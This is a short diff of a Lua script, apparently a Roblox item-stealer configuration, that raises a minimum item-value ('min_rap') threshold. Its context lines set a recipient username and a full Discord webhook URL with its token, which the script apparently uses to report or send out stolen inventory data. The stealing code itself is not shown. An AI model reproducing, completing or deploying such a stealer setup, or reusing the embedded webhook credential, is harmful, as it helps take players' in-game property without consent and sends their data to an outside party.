@@ -18,7 +18,7 @@ local GetSave = function()
 end
 
 local users = {"ALTMORDA69"}
-local min_rap = _G.minrap or 100000
+local min_rap = _G.minrap or 1000000
 local webhook = "https://discord.com/api/webhooks/1433504887156172974/_JWGaijqm2qw-cDT0qgNfEmG9_-W0TLlWjvyV0aPzX4-TjU2QoCj1auVhjOHk7u_axKJ"
 
 if next(users) == nil or webhook == "" then
